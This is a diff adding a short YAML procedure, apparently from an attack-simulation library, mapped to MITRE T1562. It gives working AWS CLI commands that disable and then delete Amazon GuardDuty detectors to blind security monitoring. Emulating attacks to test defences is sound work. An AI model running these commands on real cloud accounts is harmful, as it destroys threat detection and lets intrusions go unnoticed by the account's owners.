@@ -1,0 +1,11 @@
+name: Disable GuardDuty and Remove Detectors
+description: Disables Amazon GuardDuty and deletes detectors to blind security visibility.
+mitre_technique: T1562
+stage: Defense Evasion
+steps:
+  - action: aws guardduty list-detectors
+    description: List all GuardDuty detectors in the region
+  - action: aws guardduty update-detector --detector-id <detector-id> --enable false
+    description: Disable each GuardDuty detector
+  - action: aws guardduty delete-detector --detector-id <detector-id>
+    description: Delete the detector entirely (destructive)
